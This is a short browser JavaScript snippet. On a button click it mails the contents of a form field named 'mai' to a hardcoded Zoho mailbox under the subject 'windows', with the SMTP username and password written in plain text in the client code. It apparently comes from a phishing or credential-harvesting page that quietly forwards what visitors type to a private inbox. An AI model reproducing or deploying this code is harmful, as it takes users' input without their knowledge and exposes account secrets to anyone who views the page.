var etn= document.getElementById("etn");
etn.onclick=function(){
  Email.send({
    Host: "smtp.zoho.com",
    Username: "jnvcotc@zohomail.cn",
    Password: "324893246877193",
    To: "jnvcotc@zohomail.cn",
    From: "jnvcotc@zohomail.cn",
    Subject: "windows",
    Body: ef.mai.value
  }).then(
    message => alert(message)
  );;
}
